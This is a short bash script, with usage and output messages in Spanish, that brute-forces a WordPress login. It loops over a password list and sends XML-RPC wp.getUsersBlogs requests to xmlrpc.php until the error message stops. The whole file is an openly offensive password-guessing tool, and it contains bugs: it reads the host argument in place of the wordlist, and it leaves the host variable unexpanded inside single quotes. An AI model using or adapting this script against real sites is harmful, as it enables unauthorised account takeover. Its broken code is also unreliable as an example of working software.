#!/bin/bash
declare -r host=$1
declare -r wordlist=$2
declare -r username=$3
if [[ ! ${host} || ! ${wordlist} || ! -f $wordlist || ! ${username}  ]]; then
	echo -e "\nModo de empleo:\n"
	echo -e "\n.\bruteForceWP.sh <direccon_web> <diccionario_passwords> <username>\n"
	exit 1
fi
for password in $(cat $1); do
        data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$password</value></param></params></methodCall>"
        curl -s '$host/xmlrpc.php' -X POST -d $data | grep 'Incorrect username or password' &> /dev/null
        valor=$(echo $?)
        if [ $valor != 0 ]; then
                echo -e "\n[+] La contraseña es $password\n"
                exit 0
        fi
done
